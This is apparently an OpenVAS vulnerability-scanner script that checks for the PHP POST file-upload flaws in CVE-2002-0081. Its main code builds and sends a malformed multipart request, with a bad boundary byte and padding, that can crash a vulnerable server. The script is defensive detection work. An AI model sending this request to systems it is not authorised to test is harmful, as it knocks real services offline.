# OpenVAS Vulnerability Test
# $Id: php_split_mime.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: php POST file uploads
#
# Authors:
# Thomas Reinke <reinke@securityspace.com>
# Modified by H D Moore & Renaud Deraison to actually test for the flaw
#
# Copyright:
# Copyright (C) 2002 Thomas Reinke
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running a version of PHP earlier
than 4.1.2.

There are several flaws in how PHP handles
multipart/form-data POST requests, any one of which can
allow an attacker to gain remote access to the system.";

tag_solution = "Upgrade to PHP 4.1.2";

if(description)
{
 script_id(10867);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(4183);
 script_cve_id("CVE-2002-0081");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 
 name = "php POST file uploads";

 script_name(name);

 
 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2002 Thomas Reinke");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(http_is_dead(port:port))exit(0);

if(get_port_state(port))
{
 if ( ! can_host_php(port:port) ) exit(0);

 if(!safe_checks())
 {
  files = get_kb_list(string("www/", port, "/content/extensions/php*"));
 
  if(isnull(files))file = "/default.php";
  else {
  	files = make_list(files);
	file = files[0];
	}
  
  if(is_cgi_installed_ka(item:file, port:port))
  {
   boundary1 = string("-OPENVAS!");
   boundary2 = string("--OPENVAS!");
   clen = "567";
   dblq = raw_string(0x22);
   badb = raw_string(0x12);


   postdata = string("POST ", file, " HTTP/1.1\r\n", "Host: ", get_host_name(), "\r\n");
   postdata = string(postdata, "Referer: http://", get_host_name(), "/", file, "\r\n");
   postdata = string(postdata, "Content-type: multipart/form-data; boundary=", boundary1, "\r\n");
   postdata = string(postdata, "Content-Length: ", clen, "\r\n\r\n", boundary2, "\r\n");
   postdata = string(postdata, "Content-Disposition: form-data; name=");
  


  len = strlen(dblq) + strlen(badb) + strlen(dblq);
  big = crap(clen - len);
  postdata = string(postdata, dblq, badb, dblq, big, dblq);
 
  soc = http_open_socket(port);
  if(!soc)exit(0);
 
  send(socket:soc, data:postdata);
  
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if(http_is_dead(port: port)) { security_message(port); }
  }
 }
}
